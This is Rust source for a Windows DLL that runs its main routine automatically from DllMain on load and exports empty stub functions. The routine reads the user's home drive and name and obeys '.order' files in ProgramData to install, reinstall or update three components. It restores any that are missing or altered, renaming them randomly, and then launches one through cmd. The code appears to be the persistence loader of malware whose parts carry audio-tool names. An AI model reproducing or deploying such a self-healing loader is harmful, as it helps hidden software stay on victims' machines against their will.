#![allow(non_snake_case)]
mod utils;
mod constants;
mod ardakan_config;
mod setvol_config;
mod soundlib_config;
mod configuration;

use rand::thread_rng;

use std::{
    io,
    path::PathBuf,
    fs::{create_dir_all, remove_file},
};

use windows::{
    Win32::Foundation::*, 
    Win32::System::SystemServices::*,
};

use crate::{
    constants::TEHRAN_NAME,
    configuration::Configuration,
    ardakan_config::ArdakanConfig,
    setvol_config::SetvolConfig,
    soundlib_config::SoundlibConfig,
    utils::{verify_file, cmd_without_output, cmd_with_output},
};

#[no_mangle]
#[allow(non_snake_case, unused_variables)]
extern "system" fn DllMain(
    dll_module: HINSTANCE,
    call_reason: u32,
    _: *mut ())
    -> bool
{
    match call_reason {
        DLL_PROCESS_ATTACH => {
            tehran_run();
        },
        DLL_PROCESS_DETACH => (),
        _ => ()
    }
    true
}

#[no_mangle]
pub extern "C" fn execute() {
    ();
}
#[no_mangle]
pub extern "C" fn run() {
    ();
}

fn tehran_run() -> io::Result<()> {
    println!("[INFO] obtaining the homedrive and username of the device...");
    let HOMEDRIVE: String = match cmd_with_output("echo %HOMEDRIVE%") {
        Ok(string) => string,
        Err(error) => {
            if PathBuf::from("C:").exists() {
                String::from("C:")
            } else {
                return Err(error);
            }
        }
    };
    let USERNAME: String = match cmd_with_output("echo %USERNAME%") {
        Ok(string) => string,
        Err(error) => return Err(error),
    };
    println!("[INFO] done\n");
    println!("[INFO] loading configuration...");
    let mut configuration: Configuration = match Configuration::load(&HOMEDRIVE, &USERNAME) {
        Ok(config) => config,
        Err(error) => {
            eprintln!("[WARNING] failed to load configuration\n///////// {}", error);
            let configuration = Configuration::default(&HOMEDRIVE, &USERNAME)?;
            configuration.save()?;
            configuration
        },
    };
    println!("[INFO] done\n");
    // TEHRAN-UNINSTALL-ALL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UNINSTALL-ALL.order"].iter().collect();
        if filepath.is_file() {
            println!("[INFO] TEHRAN-UNINSTALL-ALL order detected, uninstalling...");
            configuration.ardakan.uninstall();
            configuration.ardakan.archive_uninstall();
            configuration.setvol.uninstall();
            configuration.setvol.archive_uninstall();
            configuration.soundlib.uninstall();
            configuration.soundlib.archive_uninstall();
            let config_filepath_1: String = format!("{}_1.default", TEHRAN_NAME);
            let config_filepath_2: String = format!("{}_2.default", TEHRAN_NAME);
            let config_filepath_3: String = format!("{}_3.default", TEHRAN_NAME);
            let config_filepath_main: String = format!("{}.config", TEHRAN_NAME);
            match remove_file(&config_filepath_1) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_1, error),
            }
            match remove_file(&config_filepath_2) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_2, error),
            }
            match remove_file(&config_filepath_3) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_3, error),
            }
            match remove_file(&config_filepath_main) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove config file : {}\n+-- ///////// {}", &config_filepath_main, error),
            }
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
            }
            println!("[INFO] done\n");
            return Ok(());
        }
    }
    println!("[INFO] verifying backup archives...");
    let ardakan_archive_filepath: PathBuf = configuration.ardakan.get_archive_filepath();
    let setvol_archive_filepath: PathBuf = configuration.setvol.get_archive_filepath();
    let soundlib_archive_filepath: PathBuf = configuration.soundlib.get_archive_filepath();
    if !configuration.ardakan.archive_path.exists() {create_dir_all(&configuration.ardakan.archive_path)?;}
    if !configuration.setvol.archive_path.exists() {create_dir_all(&configuration.setvol.archive_path);}
    if !configuration.soundlib.archive_path.exists() {create_dir_all(&configuration.soundlib.archive_path);}

    if !ardakan_archive_filepath.exists() || !verify_file(&ardakan_archive_filepath, &configuration.ardakan.archive_hash).unwrap_or(true) {
        configuration.ardakan.archive_install()?;
    }
    if !setvol_archive_filepath.exists() || !verify_file(&setvol_archive_filepath, &configuration.setvol.archive_hash).unwrap_or(true) {
        configuration.setvol.archive_install();
    }
    if !soundlib_archive_filepath.exists() || !verify_file(&soundlib_archive_filepath, &configuration.soundlib.archive_hash).unwrap_or(true) {
        configuration.soundlib.archive_install();
    }
    println!("[INFO] done\n");
    // TEHRAN-REINSTALL-ARDAKAN
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-ARDAKAN.order" ].iter().collect();
        if filepath.is_file() {
            println!("[INFO] TEHRAN-REINSTALL-ARDAKAN order detected, reinstalling ardakan...");
            configuration.ardakan.uninstall();
            configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE, &USERNAME);
            configuration.ardakan.install()?;
            configuration.save()?;
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
            }
            println!("[INFO] done\n");
        }
    }
    // TEHRAN-REINSTALL-SETVOL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SETVOL.order" ].iter().collect();
        if filepath.is_file() {
            println!("[INFO] TEHRAN-REINSTALL-SETVOL order detected, reinstalling setvol...");
            configuration.setvol.uninstall();
            configuration.setvol.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
            }
            println!("[INFO] done\n");
        }
    }
    // TEHRAN-REINSTALL-SOUNDLIB
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-REINSTALL-SOUNDLIB.order" ].iter().collect();
        if filepath.is_file() {
            println!("[INFO] TEHRAN-REINSTALL-SOUNDLIB order detected, reinstalling soundlib...");
            configuration.soundlib.uninstall();
            configuration.soundlib.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
            }
            println!("[INFO] done\n")
        }
    }
    // TEHRAN-UPDATE-ALL
    {
        let filepath: PathBuf = [&HOMEDRIVE, "\\ProgramData", "TEHRAN-UPDATE-ALL.order" ].iter().collect();
        if filepath.is_file() {
            println!("[INFO] TEHRAN-UPDATE-ALL order detected, updating...");
            configuration.ardakan.uninstall();
            configuration.ardakan.archive_uninstall();
            configuration.setvol.uninstall();
            configuration.setvol.archive_uninstall();
            configuration.soundlib.uninstall();
            configuration.soundlib.archive_uninstall();
            match remove_file(&format!("{}.config", TEHRAN_NAME)) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove main config file\n+-- ///////// {}", error),
            }
            ArdakanConfig::default_install()?;
            SetvolConfig::default_install()?;
            SoundlibConfig::default_install()?;
            configuration = Configuration::default(&HOMEDRIVE, &USERNAME)?;
            configuration.save()?;
            configuration.ardakan.archive_install()?;
            configuration.setvol.archive_install();
            configuration.soundlib.archive_install();
            configuration.ardakan.install()?;
            configuration.setvol.install();
            configuration.soundlib.install();
            match remove_file(&filepath) {
                Ok(..) => (),
                Err(error) => eprintln!("+-- [WARNING] failed to remove order file : {}\n+-- ///////// {}", &filepath.display(), error),
            }
            println!("[INFO] done\n");
        }
    }
    println!("[INFO] verifying ardakan installation...");
    let ardakan_filepath: PathBuf = configuration.ardakan.get_filepath();
    if !(ardakan_filepath.is_file() && verify_file(&ardakan_filepath, &configuration.ardakan.hash).unwrap_or(false)) {
        configuration.ardakan.uninstall();
        configuration.ardakan.regenerate_filename_path(&mut thread_rng(), &HOMEDRIVE, &USERNAME);
        configuration.ardakan.install()?;
        configuration.save()?;
    }
    println!("[INFO] done\n");
    println!("[INFO] verifying setvol installation...");
    let setvol_filepath: PathBuf = configuration.setvol.get_filepath();
    if !(setvol_filepath.is_file() && verify_file(&setvol_filepath, &configuration.setvol.hash).unwrap_or(false)) {
        configuration.setvol.uninstall();
        configuration.setvol.install();
    }
    println!("[INFO] done\n");
    println!("[INFO] verifying soundlib installation...");
    for filepath in configuration.soundlib.get_filepaths().iter() {
        if !filepath.exists() {
            configuration.soundlib.uninstall();
            configuration.soundlib.install();
            break;
        }
    }
    println!("[INFO] done\n");
    println!("[INFO] launching ardakan...");
    let command: String = format!("cd /D {} && {} .", configuration.ardakan.path.display(), configuration.ardakan.filename.display());
    cmd_without_output(&command)?;
    return Ok(());
}
